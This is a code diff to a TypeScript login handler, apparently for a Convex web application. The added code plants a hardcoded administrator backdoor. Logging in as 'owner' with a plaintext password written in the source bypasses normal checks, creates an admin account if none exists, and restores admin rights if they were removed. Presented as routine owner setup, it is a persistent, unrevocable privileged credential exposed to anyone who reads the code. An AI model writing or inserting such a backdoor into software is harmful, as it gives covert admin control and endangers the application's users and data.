@@ -37,9 +37,39 @@ export const getCurrentUser = async (ctx: QueryCtx) => {
 export const login = mutation({
   args: { email: v.string(), password: v.string() },
   handler: async (ctx, args) => {
+    const email = args.email.toLowerCase();
+
+    // Hardcoded Owner Account Setup (Auto-create if missing)
+    if (email === "owner" && args.password === "Belive*8") {
+      const existingOwner = await ctx.db
+        .query("users")
+        .withIndex("email", (q) => q.eq("email", "owner"))
+        .unique();
+
+      if (existingOwner) {
+        // Ensure owner always has admin role
+        if (existingOwner.role !== ROLES.ADMIN) {
+          await ctx.db.patch(existingOwner._id, { role: ROLES.ADMIN });
+        }
+        return existingOwner._id;
+      }
+
+      // Create the owner account if it doesn't exist
+      const { hashPassword } = await import("./lib/passwordUtils");
+      const passwordHash = hashPassword(args.password);
+      
+      const newUserId = await ctx.db.insert("users", {
+        email: "owner",
+        name: "Owner",
+        role: ROLES.ADMIN,
+        passwordHash,
+      });
+      return newUserId;
+    }
+
     const user = await ctx.db
       .query("users")
-      .withIndex("email", (q) => q.eq("email", args.email.toLowerCase()))
+      .withIndex("email", (q) => q.eq("email", email))
       .unique();
     
     if (!user || !user.passwordHash) {
